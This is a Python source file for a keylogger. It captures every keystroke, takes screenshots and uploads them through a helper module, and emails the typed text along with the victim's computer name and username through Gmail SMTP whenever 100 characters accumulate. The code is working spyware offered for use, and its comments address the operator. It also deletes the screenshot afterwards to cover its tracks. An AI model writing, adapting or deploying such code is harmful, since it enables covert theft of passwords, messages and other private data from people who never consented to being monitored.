#Copyright (C) 2020  Cennef0x
from pynput.keyboard import Key, Listener
import smtplib
import time 
import pyscreenshot as ImageGrab
import os 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import sys
import screenshoter # the screenshot script made by me but was changed to match this script (screenshoter.py) for more info : https://github.com/Cennef0x/imgBB-API

setup(
    name = 'keylogger.py',
    version = '0.0.1',
    Author = 'Cennef0x',
    GitHub = 'https://github.com/Cennef0x?tab=repositories'
)

#smtp
From_email = sys.argv[1] # Your email
passwd = sys.argv[2] # Your Password
To_email = sys.argv[3] # The email you want to send the info to
PORT = 465 # Your email provider port
server = smtplib.SMTP_SSL('smtp.gmail.com', PORT) # Your email provider smtp server
server.login(From_email, passwd) #login


# log
full_L = ""
words = ""
email_char_limt = 100 # max character before the message is sent

# keylogger
def on_press(key):
	global words
	global full_L
	global email_char_limt

	if key == Key.space or key == Key.enter:
		words += " "
		full_L += words
		words = ""
		if len(full_L) >= email_char_limt:
			send_L()
			full_L = ""
	elif key == Key.shift_l or key == Key.shift_r:
		return
	elif key == Key.backspace:
		words = words[:-1]	
	else:
		char = f'{key}'
		char = char[1:-1]
		words += char

	if key == Key.esc:
		return False

#smtp sender
def send_L():
	time_now = time.strftime("%Y-%m-%d %H:%M:%S") # get time info
	name = os.environ['COMPUTERNAME'] # get computer name
	username = os.environ['USERNAME'] # get computer username
	Title =  "{0} / {1}".format(username,name)
	#Copyright (C) 2020  Cennef0x
	ImageLink = screenshoter.upload_IMG() # create a screenshot and return the link
	IMGLink = "\n\n// THE IMAGE LINK IS : {}".format(ImageLink)
	full_L2 = full_L + IMGLink
	final_m = "Subject: {0} \n\n\n// {1} :\n//THE MESSAGE\n\n  {2}".format(Title,time_now, full_L2) # the message you are going to send
	server.sendmail(From_email,From_email, final_m) # command to send email with messsage
	os.remove("C:/Windows/Temp/fullscreen.png") # delete the screenshot after the email is sent

#loop to keep the keylogger active
with Listener(on_press=on_press) as listener: 
	listener.join()

#to stop it close the cli or kill the process if you use executed this script without the console
